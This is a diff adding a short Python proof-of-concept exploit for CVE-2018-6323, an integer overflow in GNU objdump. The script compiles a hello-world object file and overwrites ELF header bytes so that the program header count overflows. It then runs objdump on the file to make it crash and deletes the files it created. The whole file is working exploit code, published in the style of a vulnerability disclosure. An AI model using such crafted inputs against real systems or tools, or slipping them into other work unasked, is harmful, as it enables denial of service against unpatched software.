@@ -1,0 +1,33 @@
+# Exploit Title: Objdump - Integer Overflow Crash POC
+# Date: 12.02.2018
+# Exploit Author: r4xis
+# Tested Version: 2.26.1
+# Vuln Version: <2.29.1
+# CVE: cve-2018-6323
+# Tested on: Ubuntu 16.04 32-bit 
+# Vulnerability Details: 
+# https://www.cvedetails.com/cve/CVE-2018-6323/
+# https://sourceware.org/bugzilla/show_bug.cgi?id=22746
+
+
+import os
+
+hello = "#include<stdio.h>\nint main(){printf(\"HelloWorld!\\n\"); return 0;}"
+f = open("helloWorld.c", 'w')
+f.write(hello)
+f.close()
+
+os.system("gcc -c helloWorld.c -o test")
+# file test
+# test: ELF 32-bit LSB relocatable, Intel 80386, version 1 (SYSV), not stripped
+
+f = open("test", 'rb+')
+f.read(0x2c)
+f.write("\xff\xff") # 65535
+f.read(0x244-0x2c-2)
+f.write("\x00\x00\x00\x20") # 536870912
+f.close()
+# readelf -h test
+# Number of program headers:         65535 (536870912)
+
+os.system("objdump -x test; rm -r helloWorld.c test")
